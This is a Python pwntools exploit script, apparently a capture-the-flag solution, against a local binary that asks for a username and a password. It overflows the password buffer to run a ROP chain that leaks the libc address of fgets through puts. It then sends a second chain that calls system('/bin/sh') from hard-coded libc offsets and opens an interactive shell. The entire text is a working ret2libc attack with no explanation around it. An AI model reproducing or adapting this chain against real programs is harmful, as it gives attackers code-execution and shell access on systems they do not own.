from pwn import *

context.terminal = ["konsole", "-e"]
context.binary = binary = elf = ELF("./program.elf_patched")

p = process()

# gdb.attach(p)

pop_rdi_ret = p64(0x00000000004004b6)
ret = p64(0x0000000000400356)

main_address = p64(binary.symbols.main)

got_puts_address = p64(binary.got.puts)
got_fgets_address = p64(binary.got.fgets)
got_printf_address = p64(binary.got.printf)


# print("got puts address: {}".format(hex(binary.got.puts)))
# print("got fgets address: {}".format(hex(binary.got.fgets)))
# print("got printf address: {}".format(hex(binary.got.printf)))

plt_puts_address = p64(binary.plt.puts)
plt_fgets_address = p64(binary.plt.fgets)
plt_printf_address = p64(binary.plt.printf)

# print("plt puts address: {}".format(hex(binary.plt.puts)))
# print("plt fgets address: {}".format(hex(binary.plt.fgets)))
# print("plt printf address: {}".format(hex(binary.plt.printf)))


payload = b"A"*56
payload += ret
payload += pop_rdi_ret + got_fgets_address + plt_puts_address
payload += ret + main_address


p.recvuntil(b": ")
p.sendline(b"HackTWK")
p.recvuntil(b"password: ")
p.sendline(payload)
output = p.recvuntil(b"username: ")
print(output)

# Split output by newlines
lines = output.split(b'\n')

# Find all possible 6-byte leaks
leaks = [line for line in lines if len(line) == 6]

fgets_leak = u64(leaks[0].ljust(8, b'\x00'))

print(f"Leaked fgets: {hex(fgets_leak)}")

pause()
p.sendline(b"HackTWK")
output = p.recvuntil(b": ")
print(output)

# payload = b"abcdefghijklmnopqrstuvwxyz123456" + b"A"*24
payload = b"A"*56
payload += ret
payload += pop_rdi_ret + p64(fgets_leak + 0x1592f8) # str_bin_sh
payload += p64(fgets_leak - 0x2e610) # system

# will be a call to: system("/bin/sh")

p.sendline(payload)

p.interactive()
